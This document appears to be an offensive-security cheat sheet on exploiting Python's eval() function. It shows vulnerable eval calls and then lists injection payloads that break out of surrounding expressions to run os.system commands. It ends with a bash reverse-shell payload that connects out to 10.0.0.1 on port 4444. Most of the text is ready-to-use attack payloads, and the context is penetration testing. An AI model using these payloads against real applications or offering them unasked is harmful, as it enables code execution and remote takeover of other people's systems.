# Python Eval Code Execution

The Python's `eval()` method is vulnerable to arbitrary code execution.

### Investigation <a href="#investigation" id="investigation"></a>

```shellscript
eval(text)
eval(f"5 + {num}")
```

If the Python script allows us to input some value to the **"text"** variable, we can inject arbitrary code.

### Arbitrary Code Execution <a href="#arbitrary-code-execution" id="arbitrary-code-execution"></a>

Most of the time, we need to bypass another expression to execute our desired command.

```shellscript
__import__('os').system('id')

<!-- Bypass another expression in eval -->
),__import__('os').system('id')
'),__import__('os').system('id')
},__import__('os').system('id')
),__import__('os').system('id')#
```

#### Reverse Shell <a href="#reverse-shell" id="reverse-shell"></a>

```
__import__('os').system('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"')
```
